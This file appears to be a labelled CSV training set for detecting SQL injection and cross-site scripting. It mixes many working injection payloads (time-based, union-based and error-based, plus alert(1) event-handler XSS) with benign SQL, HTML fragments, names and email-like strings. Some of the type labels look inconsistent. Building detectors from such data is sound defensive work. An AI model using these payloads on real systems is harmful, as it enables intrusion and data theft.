Text,Label,type
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",1,sql
"   SELECT Employees.stretch, COUNT ( Orders.reviewID )  AS springFROM    ( OrdersINNER JOIN took ON Orders.improveID  =  Employees.hurtID ) ",0,sql
"<nextid oncut=""alert(1)"" contenteditable>test</nextid>",2,xss
1'   )    )    as tlsl where 8467  =  8467,1,sql
SELECT * FROM lose  WHERE other NOT LIKE '[southern]%',0,sql
"   SELECT Employees.almost, COUNT ( Orders.largeID )  AS miceFROM    ( OrdersINNER JOIN powerful ON Orders.dishID  =  Employees.didID ) ",0,sql
"1""  )   as nraw where 7984  =  7984 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
"admin""  )   or   (  ""1""  =  ""1",1,sql
1' where 8159  =  8159 union all select null#,1,sql
"1  )   union all select null,null--",1,sql
"   SELECT brought, worth, lady FROM stand WHERE current  IS NULL",0,sql
4.42213E+15,0,sql
SELECT valuable ( s )  FROM package UNION,0,xss
SELECT * FROM  ( SELECT far FROM handle ) ,0,sql
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1,sql
" select * from users where id  =  1 or ""@#"" or 1  =  1 -- 1",1,xss
8.60573E+15,0,sql
SELECT offer ( s )  FROM speak LEFT JOIN,0,sql
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>",2,xss
SELECT * FROM also WHERE Price NOT BETWEEN 10 AND 20,0,sql
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",1,xss
SELECT * FROM industry,0,sql
1'  )   where 5287  =  5287 and 7533  =  7533--,1,xss
SELECT * FROM modern 3,0,sql
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',1,sql
SELECT TOP 3 * FROM lake WHERE correct = 'him' SELECT * FROM tube,0,sql
"Glossary </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0,xss
"<li><a href=""/wiki/Algorithmic_efficiency"" title=""Algorithmic efficiency"">Algorithmic efficiency </a> </li>",0,xss
SELECT * FROM plane WHERE band = 'gold' FETCH FIRST 3 ROWS ONLY,0,sql
63829565b,0,sql
"<dl class=""docutils"">",0,xss
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1,xss
" SELECT * FROM he ORDER BY usually ASC, rapidly DESC",0,xss
"<style>@keyframes slidein {}</style><address style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></address>",2,xss
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",2,xss
<shadow onpointermove=alert(1)>XSS</shadow>,2,xss
<dir onpointerenter=alert(1)>XSS</dir>,2,xss
SELECT equally FROM gate UNION SELECT mouth FROM itself ORDER BY car,0,sql
SELECT * FROM share WHERE curious BETWEEN 'better' AND 'office',0,sql
"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>",2,xss
SELECT * FROM either FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
waitfor delay '0:0:5' and   (  '%'  =  ',1,sql
"<meta onbeforecut=""alert(1)"" contenteditable>test</meta>",2,xss
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",1,sql
SELECT ten ( s )  FROM stop UNION,0,sql
"  SELECT * FROM classroom WHERE simplest NOT IN  ( 'pleasant', 'stems', 'summer' )  ",0,xss
aguilar de bureba,0,sql
"<body class=""wy-body-for-nav"">",0,xss
end and    (    (     (  '%'  =  ',1,sql
SELECT count ( s )  FROM center LEFT JOIN,0,sql
"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",2,xss
	 </span>,0,xss
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0,sql
" SELECT * FROM species ORDER BY steel, drop",0,sql
caca ihnen,0,sql
econmicamente,0,sql
"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"calle robert gerhard, s/n 6c",0,sql
" SELECT * FROM own ORDER BY busy, direct",0,xss
<nobr id=x tabindex=1 onbeforedeactivate=alert(1)></nobr><input autofocus>,2,xss
"<dt><a class=""reference internal"" href=""faq.html""><span class=""doc"">Frequently Asked Questions",0,xss
"INSERT INTO motor ( gasoline, something, single, because, below, announced )  VALUES  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",0,xss
<discard onpointermove=alert(1)>XSS</discard>,2,xss
"<style>:target {transform: rotate(180deg);}</style><li id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></li>",2,xss
"   SELECT cause,may,yesterday,cookies,fill     (  (  upper JOIN common ON tide.facing =  brain.object )   INNER JOIN blowON Orders.notice =  inch.sangID ) ",0,sql
<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,2,xss
-9178'  )   or 9779  =  6351,1,sql
"<fieldset onbeforecut=""alert(1)"" contenteditable>test</fieldset>",2,xss
SELECT * FROM  ( SELECT somehow FROM rain ) ,0,xss
	 </span> </li>,0,xss
-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,sql
1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,1,sql
SELECT * FROM heat WHERE    NOT army = 'under',0,sql
 UPDATE exercise SET arm = 'location'WHERE stove = 'organized',0,sql
"<p>Thought-capable artificial beings appeared as storytelling devices since antiquity,<sup id=""cite_ref-AI_in_myth_26-1"" class=""reference""><a href=""#cite_note-AI_in_myth-26"">&#91;26&#93; </a> </sup>",0,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;474–505 </li> </ul>",0,xss
<textarea onpointerleave=alert(1)>XSS</textarea>,2,xss
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
-8028%'   )    )     )   or 5042  =  5214,1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
youping,0,sql
"  SELECT Orders.eightrID, Employees.necessary, Employees.stranger FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.withID ORDER BY Orders.writeID",0,sql
SELECT * FROM pride FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grandfather,0,sql
<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>,2,xss
"<link onmousemove=""alert(1)"">test</link>",2,xss
"1',  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",1,sql
morcn,0,sql
<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>,2,xss
"  SELECT fallenID AS ID, certain AS stay FROM supply",0,sql
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"   SELECT piece,lunch,rush,information,part     (  (  definition JOIN value ON bad.silver =  plant.vegetable )   INNER JOIN sidesON Orders.wall =  vote.baseID ) ",0,sql
"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",1,xss
yamile de francisco,0,sql
"1%'  )   and make_set  (  1458  =  3902,3902  )   and   (  '%'  =  '",1,sql
"-2423'   )    )     )   union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1,sql
"-5972"" or 8509  =  3448#",1,sql
"1%'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   '%'  =  '",1,sql
DELETE FROM think,0,sql
"  SELECT Orders.instantrID, Employees.captain, Employees.though FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dotID ORDER BY Orders.anyID",0,sql
 </li>,0,xss
 </li>,0,xss
"<noscript oncontextmenu=""alert(1)"">test</noscript>",2,xss
SELECT * FROM fat 3 SELECT * FROM dead,0,sql
"torre de esteban hambrn, la",0,sql
34491,0,sql
1.4996E+15,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
<IMG SRC=javascript:alert('')>,2,xss
chimillas,0,sql
lladurs,0,sql
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("""")>",2,xss
<col onpointerout=alert(1)>XSS</col>,2,xss
"oso, el",0,sql
	 </span> ,0,xss
23 OR 1  =  1,1,sql
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'qvrd'  =  'qvrd",1,sql
"  UPDATE keep SET rice =  'pine', City =  'tower' WHERE birds =  split",0,sql
"<li><cite id=""CITEREFWasonShapiro1966"" class=""citation book""><a href=""/wiki/Peter_Cathcart_Wason"" title=""Peter Cathcart Wason"">Wason, P. C. </a>; Shapiro, D. (1966). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/newhorizonsinpsy0000foss"">""Reasoning"" </a> ",0,xss
"  SELECT * FROM meet WHERE press IN  ( 'original', 'individual', 'firm' )  ",0,sql
url(javascript:alert('')),2,xss
SELECT * FROM brother 3,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=41"" title=""Edit section: Law-related professions"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationstart=""alert(1)""></bgsound>",2,xss
SELECT * FROM organized WHERE book NOT LIKE '[announced]%',0,sql
"1""  )   where 9855  =  9855",1,sql
1856,0,sql
"1""  )   and sleep  (  5  )  #",1,sql
SELECT LOG2 ( 64 ) ;,0,sql
"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1,sql
israel_piggot@joyclub.pe,0,xss
"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",1,xss
1'  )   rlike   (  select   (  case when   (  9308  =  2540  )   then 1 else 0x28 end   )    )    and   (  'rghd'  =  'rghd,1,sql
SELECT * FROM  ( SELECT discuss FROM quietly ) ,0,sql
07077546d,0,sql
"1' union all select null,null,null,null,null,null,null,null#",1,sql
"calle pintor picasso, 182 5?d",0,xss
 </li>,0,xss
SELECT * FROM detail WHERE building = 'sum' LIMIT 3,0,sql
SELECT AVG ( balloon ) FROM stream,0,sql
killan@923.fr,0,sql
sigut,0,sql
" SELECT OrderID, Quantity, CASE     WHEN Quantity > 30 THEN ""The quantity is greater than 30""     WHEN Quantity  =  30 THEN ""The quantity is 30""     ELSE ""The quantity is under 30"" END FROM OrderDetails;",0,sql
kulle@coworkers.tl,0,xss
"<p onpaste=""alert(1)"" contenteditable>test</p>",2,xss
silas,0,sql
"  SELECT gray,vessels,eventually FROM effect LEFT JOIN Orders ON create.duckID =  itself.instead ORDER BY tales.degree",0,sql
SELECT AVG ( stop ) FROM crack SELECT SUM ( essential ) ,0,sql
SELECT TOP 50 PERCENT * FROM product SELECT * FROM lack FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circus,0,sql
"-4419%""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
1'+  (  select 'stdl' where 4581  =  4581,1,sql
SELECT ruler ( s )  FROM liquid,0,xss
"calle tiberiades, 90, 8-f",0,sql
SELECT bat ( s )  FROM sort UNION,0,xss
1'||  (  select 'aojt' from dual where 8499  =  8499,1,sql
"<li><a href=""/wiki/Atomtronics"" title=""Atomtronics"">Atomtronics </a> </li>",0,xss
penarroya ingla,0,sql
SELECT * FROM garden WHERE mood BETWEEN 'possible' AND 'wood',0,sql
"SELECT DATE ( ""The   date is 2017-06-15"" ) ;",0,sql
SELECT TOP 3 * FROM tune SELECT * FROM feel 3SELECT * FROM statement,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28074 )  ORDER BY meta_id ASC",0,sql
"<li><a href=""/wiki/Logic_in_computer_science"" title=""Logic in computer science"">Logic </a> </li>",0,xss
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,2,xss
"	<div class=""portal"" role=""navigation"" id=""p-tb""  aria-labelledby=""p-tb-label"">",0,xss
melucci,0,xss
"1%""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>,2,xss
netty9,0,xss
"1%""   )    )     )   rlike sleep  (  5  )  #",1,sql
"<li onmouseleave=""alert(1)"">test</li>",2,xss
"<div class=""toctree-wrapper compound"">",0,xss
SELECT AVG ( sat ) FROM character SELECT SUM ( practical ) ,0,sql
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Washington+Post&amp;rft.atitle=Bill+Gates+on+dangers+of+artificial+intelligence%3A+%27I+don%27t+understand+why+some+people+are+not+concerned%27&amp;rft.date=2015-01-28&amp;rft.issn=0190-8286&amp;rft.aulast=Holley&amp;rft.aufirst=Peter&amp;rft_id=https%3A%2F%2Fwww.washingtonpost.com%2Fnews%2Fthe-switch%2Fwp%2F2015%2F01%2F28%2Fbill-gates-on-dangers-of-artificial-intelligence-dont-understand-why-some-people-are-not-concerned%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT eager FROM has UNION SELECT were FROM gas ORDER BY around,0,sql
<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>,2,xss
<applet onpointerout=alert(1)>XSS</applet>,2,xss
husky_hurlic@ropadegolf.sn,0,sql
alfamn,0,sql
1  )   as bzuh where 8041  =  8041 and 6307  =  9200#,1,sql
-4058  )   union all select 9184--,1,sql
 UPDATE single SET view = 'at'WHERE huge = 'made',0,sql
SELECT * FROM ran WHERE    NOT lunch = 'nearer',0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT * FROM folks WHERE activity IN  ( SELECT frozen FROM did ) ,0,sql
1   )    )    as jvvs where 9594  =  9594,1,sql
"   SELECT wave, reason+ ', ' + produce+ ' ' + class+ ', ' + or AS behavior  FROM dawn",0,sql
"<li><a href=""/wiki/Center_for_Human-Compatible_Artificial_Intelligence"" title=""Center for Human-Compatible Artificial Intelligence"">Center for Human-Compatible Artificial Intelligence </a> </li>",0,xss
1'   )    )    as dago where 9788  =  9788,1,xss
coursdev,0,sql
blancafort,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",1,sql
SELECT * FROM tears WHERE which BETWEEN stiff09/01/1996report AND pride15/31/1996bare,0,xss
"<span id=""id1"">",0,xss
chicon merlo,0,xss
"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>",2,xss
"  SELECT * FROM vertical WHERE model IN  ( 'thing', 'because', 'satisfied' )  ",0,xss
SELECT * FROM live WHERE    NOT pilot = 'cake',0,sql
3.53283E+14,0,xss
mccollon@irmedia.ca,0,sql
"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",2,xss
4.5422E+15,0,sql
"<mark ondblclick=""alert(1)"">test</mark>",2,xss
"<li><a href=""/wiki/Biosemiotics"" title=""Biosemiotics"">Biosemiotics </a> </li>",0,xss
abraham,0,xss
end--,1,sql
"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",2,xss
select sleep  (  5  )   and    (    (   8679  =  8679,1,sql
"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup",1,sql
SELECT * FROM running WHERE deal BETWEEN shown09/01/1996pie AND recognize15/31/1996got,0,sql
07194416q,0,sql
"<ul><li><a href=""/wiki/Programmable_metallization_cell"" title=""Programmable metallization cell"">CBRAM </a> </li>",0,xss
SELECT * FROM piece WHERE twelve = 'ship'  AND City = 'excellent',0,sql
" SELECT * FROM correct ORDER BY clothing, leader",0,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;62–73 </li>",0,xss
"<li><a href=""/wiki/Property_dualism"" title=""Property dualism"">Property dualism </a> </li>",0,xss
llambilles,0,sql
46724,0,sql
"<picture onmouseover=""alert(1)"">test</picture>",2,xss
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,sql
limpi$aas,0,sql
rhetta,0,sql
 UPDATE block SET village = 'pleasure'WHERE knowledge = 'during',0,sql
"<map onmouseenter=""alert(1)"">test</map>",2,xss
7.87131E+15,0,xss
"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",1,sql
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv",1,sql
matungo,0,sql
"<header onkeydown=""alert(1)"" contenteditable>test</header>",2,xss
SELECT TOP 50 PERCENT * FROM aware,0,sql
-7565'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'gymz'  =  'gymz,1,sql
"	 </span> <span class=""reference-text"">",0,xss
"<samp onmouseout=""alert(1)"">test</samp>",2,xss
<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>,2,xss
SELECT * FROM range WHERE indicate = 'discuss'  AND City = 'made',0,sql
28670,0,sql
49645694x,0,sql
SELECT * FROM season FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM canal,0,sql
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,sql
SELECT COUNT ( paper )  FROM basic,0,sql
"<div id=""p-search"" role=""search"">",0,xss
s16nio5o,0,xss
82063475g,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Fukushima, K. (1980). ""Neocognitron: A self-organizing neural network model for a mechanism of pattern recognition unaffected by shift in position"". <i>Biological Cybernetics </i>. <b>36 </b> (4): 193–202. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fbf00344251"">10.1007/bf00344251 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/7370364"">7370364 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Biological+Cybernetics&amp;rft.atitle=Neocognitron%3A+A+self-organizing+neural+network+model+for+a+mechanism+of+pattern+recognition+unaffected+by+shift+in+position&amp;rft.volume=36&amp;rft.issue=4&amp;rft.pages=193-202&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1007%2Fbf00344251&amp;rft_id=info%3Apmid%2F7370364&amp;rft.aulast=Fukushima&amp;rft.aufirst=K.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
